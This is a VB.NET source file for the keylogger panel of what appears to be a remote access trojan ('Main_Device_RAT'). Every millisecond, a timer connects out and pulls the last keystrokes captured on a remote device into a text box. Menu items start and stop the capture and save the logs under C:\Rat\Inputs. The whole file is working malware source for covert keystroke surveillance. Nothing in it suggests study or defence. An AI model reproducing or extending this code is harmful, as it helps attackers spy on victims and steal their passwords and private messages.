
Public Class KeyLogger
    Public Rat As New Main_Device_RAT

    Private Sub KeyLogger_FormClosed(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosedEventArgs) Handles Me.FormClosed
        Try
            Timer1.Dispose()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub KeyLogger_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            Timer1.Interval = 1
            Timer1.Start()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
    Public Sub Getloggs()
        Try
            Form1.Connect()
            Dim Keys As String = Rat.GetLastKeys()
            RichTextBox1.Text = RichTextBox1.Text & Keys
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub Timer1_Tick(ByVal sender As Object, ByVal e As System.EventArgs) Handles Timer1.Tick
            Getloggs()
    End Sub

    Private Sub SaveTextToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SaveTextToolStripMenuItem.Click
        Try
            If IO.Directory.Exists("C:\Rat") Then
                If IO.Directory.Exists("C:\Rat\Inputs") Then
                    If RichTextBox1.Text = "" Then
                    Else
                        IO.File.WriteAllText("C:\Rat\Inputs\" & Set_Files.Now.ToString & ".txt", RichTextBox1.Text)
                    End If
                Else
                    IO.Directory.CreateDirectory("C:\Rat\Inputs")
                    If RichTextBox1.Text = "" Then
                    Else
                        IO.File.WriteAllText("C:\Rat\Inputs\" & Set_Files.Now.ToString & ".txt", RichTextBox1.Text)
                    End If
                End If
            Else
                IO.Directory.CreateDirectory("C:\Rat")
                IO.Directory.CreateDirectory("C:\Rat\Inputs")
                If RichTextBox1.Text = "" Then
                Else
                    IO.File.WriteAllText("C:\Rat\Inputs\" & Set_Files.Now.ToString & ".txt", RichTextBox1.Text)
                End If
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub ClearToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ClearToolStripMenuItem.Click
        Try
            RichTextBox1.Text = ""
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub StopToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StopToolStripMenuItem.Click
        Try
            Timer1.Stop()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub StartToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartToolStripMenuItem.Click
        Try
            Timer1.Start()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
End Class